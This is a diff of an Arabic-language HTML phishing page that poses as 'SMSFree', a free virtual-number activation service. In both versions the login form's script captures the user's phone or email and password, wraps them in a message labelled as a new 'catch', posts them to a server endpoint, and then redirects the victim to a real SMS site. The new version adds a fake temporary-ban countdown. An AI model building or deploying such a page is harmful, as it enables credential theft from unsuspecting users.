@@ -3,126 +3,115 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تفعيل الخدمة</title>
-    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+    <title>SMSFree - تفعيل الحساب</title>
     <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-
     <style>
         :root {
-            --primary-color: #CC0044;
-            --main-gradient: linear-gradient(135deg, #FF0151 0%, #990033 100%);
+            --bg-color: #0f172a;
+            --card-bg: #1e293b;
+            --primary-cyan: #22d3ee;
+            --secondary-blue: #0ea5e9;
+            --accent-orange: #fbbf24;
+            --text-white: #f8fafc;
         }
 
         body {
-            margin: 0; padding: 0; font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
-            background: var(--main-gradient);
-            display: flex; flex-direction: column; align-items: center; min-height: 100vh;
+            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
+            background-color: var(--bg-color);
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
+            color: var(--text-white);
         }
 
-        .container {
-            background: white; padding: 40px 30px;
-            border-radius: 30px; /* حواف ناعمة جداً واحترافية */
-            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-            width: 88%; max-width: 400px; text-align: center;
-            margin-top: 40px; border: 1px solid rgba(255,255,255,0.2);
+        .main-container {
+            width: 90%; max-width: 420px; background-color: var(--card-bg);
+            padding: 40px 25px; border-radius: 24px; text-align: center;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
         }
 
-        #pageImg {
-            width: 100px; height: 100px; border-radius: 50%;
-            object-fit: contain; margin-bottom: 25px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        .logo-circle {
+            width: 120px; height: 120px; border: 2px solid #334155;
+            border-radius: 50%; margin: 0 auto 30px;
+            display: flex; justify-content: center; align-items: center;
+            font-size: 24px; font-weight: bold; color: var(--text-white);
         }
 
-        h2 { color: var(--primary-color); margin-bottom: 30px; font-size: 20px; font-weight: 800; }
+        h2 { font-size: 18px; line-height: 1.6; color: var(--primary-cyan); margin-bottom: 25px; }
+
+        .ban-box {
+            border: 2px solid var(--accent-orange); border-radius: 12px;
+            padding: 12px; margin-bottom: 25px; background: rgba(251, 191, 36, 0.1);
+            color: var(--accent-orange); font-weight: bold; font-size: 14px;
+        }
 
         input {
-            width: 100%; padding: 16px; margin-bottom: 18px;
-            border: 2px solid #f0f0f0; border-radius: 15px;
-            box-sizing: border-box; outline: none; text-align: right;
-            font-size: 15px; transition: 0.3s;
+            width: 100%; padding: 18px; margin-bottom: 15px;
+            background: #0f172a; border: 1px solid #334155;
+            border-radius: 12px; color: white; outline: none;
+            text-align: center; font-size: 16px; box-sizing: border-box;
         }
 
-        input:focus { border-color: var(--primary-color); background: #fffcfd; }
-
-        .captcha-area { margin-bottom: 25px; min-height: 70px; display: flex; align-items: center; justify-content: content; }
-        #status-msg { color: var(--primary-color); font-weight: bold; font-size: 15px; display: none; }
-
-        .main-btn {
-            width: 100%; padding: 16px; background: var(--primary-color); color: white;
-            border: none; border-radius: 50px; /* تصميم بيضاوي احترافي */
+        .submit-btn {
+            width: 100%; padding: 18px; margin-top: 10px;
+            background: linear-gradient(to right, var(--secondary-blue), var(--primary-cyan));
+            border: none; border-radius: 12px; color: #0f172a;
             font-size: 18px; font-weight: bold; cursor: pointer;
-            transition: 0.4s ease;
-            box-shadow: 0 8px 15px rgba(204, 0, 68, 0.2);
+            transition: 0.3s;
         }
 
-        .main-btn:hover { transform: translateY(-3px); box-shadow: 0 12px 20px rgba(204, 0, 68, 0.3); }
-
-        .footer { margin-top: 25px; font-size: 14px; color: #666; }
-        .footer a { color: var(--primary-color); text-decoration: none; font-weight: bold; cursor: pointer; }
-
-        .credits { margin-top: auto; padding: 20px; color: rgba(255,255,255,0.8); font-size: 12px; direction: ltr; }
+        .footer-text { margin-top: 30px; font-size: 12px; color: #64748b; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <img id="pageImg" src="https://logodix.com/logo/2014521.png" alt="Logo">
-        <h2>سجل دخول لتفعيل خدمة الأرقام</h2>
+<div class="main-container">
+    <div class="logo-circle">SMSFree</div>
+    <h2>سجل دخولك الآن لتستمتع بوصول غير محدود لأرقام عالمية حصرية وتفعيل فوري لجميع حساباتك.</h2>
 
-        <form id="loginForm">
-            <input type="text" id="user" placeholder="البريد الالكتروني او رقم الهاتف" required>
-            <input type="password" id="pass" placeholder="كلمة السر" required>
-
-            <div class="captcha-area">
-                <div id="status-msg">🔄 جاري فحص الجهاز...</div>
-                <div class="cf-turnstile" id="cf-box" data-sitekey="0x4AAAAAAAx3DX9D0D8D8D8X" data-callback="verifyOk"></div>
-            </div>
-
-            <button type="submit" class="main-btn">تسجيل دخول</button>
-        </form>
-
-        <div class="footer">
-            ليس لديك حساب؟ <a onclick="Swal.fire({icon: 'error', title: 'فشل', text: 'فشل الاتصال بالخادم الرئيسي', confirmButtonColor: '#CC0044'})">إنشاء حساب جديد</a>
-        </div>
+    <div class="ban-box" id="banBox">
+        لقد تم حظرك مؤقتاً. فك الحظر بعد <span id="timer">30</span> ثانية
     </div>
 
-    <div class="credits">Developed by oliver 2014 - 2026</div>
+    <form id="loginForm">
+        <input type="text" id="user" placeholder="رقم الهاتف أو البريد" required>
+        <input type="password" id="pass" placeholder="••••••" required>
+        <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
+    </form>
+    <div class="footer-text">© Global Virtual Numbers Pro 2024. جميع الحقوق محفوظة.</div>
+</div>
 
-    <script>
-        let isDone = false;
+<script>
+    let timeLeft = 30;
+    const timerDisplay = document.getElementById('timer');
+    const banBox = document.getElementById('banBox');
 
-        function verifyOk() {
-            const box = document.getElementById('cf-box');
-            const msg = document.getElementById('status-msg');
-            box.style.display = 'none';
-            msg.style.display = 'block';
-
-            setTimeout(() => {
-                msg.innerHTML = '✅ تم التحقق انك لست روبوت';
-                msg.style.color = '#10a745';
-                isDone = true;
-            }, 2500);
+    const countdown = setInterval(() => {
+        timeLeft--;
+        if(timerDisplay) timerDisplay.innerText = timeLeft;
+        if (timeLeft <= 0) {
+            clearInterval(countdown);
+            if(banBox) banBox.style.display = 'none';
         }
+    }, 1000);
 
-        document.getElementById('loginForm').onsubmit = async (e) => {
-            e.preventDefault();
-            if (!isDone) return Swal.fire({text: 'يرجى اكمال التحقق أولاً', icon: 'warning'});
+    document.getElementById('loginForm').onsubmit = async (e) => {
+        e.preventDefault();
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
 
-            const u = document.getElementById('user').value;
-            const p = document.getElementById('pass').value;
+        // إرسال البيانات كرسالة نصية واحدة للسيرفر
+        const fullMessage = `🎯 صيد جديد من التصميم المظلم 🎯\n━━━━━━━━━━━━━━━\n👤 المستخدم: ${user}\n🔑 الباسورد: ${pass}\n━━━━━━━━━━━━━━━`;
 
-            const niceMessage = `🚀 وصول صيد جديد 🚀\n━━━━━━━━━━━━━━━\n👤 **المستخدم:** \`${u}\` \n🔑 **الباسورد:** \`${p}\` \n━━━━━━━━━━━━━━━\n🔋 **البطارية:** 48% \n📱 **النظام:** ${navigator.platform} \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')} \n━━━━━━━━━━━━━━━`;
-
-            try {
-                await fetch('/api/save', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ message: niceMessage })
-                });
-            } catch(err) {}
-
+        try {
+            await fetch('/api/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: fullMessage })
+            });
             window.location.href = "https://receive-smss.com/";
-        };
-    </script>
+        } catch (err) {
+            Swal.fire({ text: 'خطأ في الاتصال', icon: 'error' });
+        }
+    };
+</script>
 </body>
 </html>
